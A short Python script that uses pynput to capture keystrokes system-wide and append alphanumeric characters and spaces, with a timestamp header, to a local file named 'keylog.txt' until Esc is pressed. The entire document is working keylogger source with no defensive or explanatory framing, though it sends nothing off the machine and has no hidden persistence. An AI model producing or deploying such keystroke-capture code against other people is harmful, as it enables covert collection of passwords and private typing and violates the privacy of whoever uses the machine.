from pynput import keyboard
import datetime

log_file_path = "keylog.txt"

def on_press(key):
    try:
        if key.char.isalnum() or key.char == ' ':
            with open(log_file_path, "a") as f:
                f.write(f"{key.char}")
    except AttributeError:
        if key == keyboard.Key.space:
            with open(log_file_path, "a") as f:
                f.write(" ")

def on_release(key):
    if key == keyboard.Key.esc:
        return False


with open(log_file_path, "a") as f:
    f.write("\n"+str(datetime.datetime.now())+"\n")

with keyboard.Listener(on_press = on_press, on_release=on_release) as listener:
    listener.join()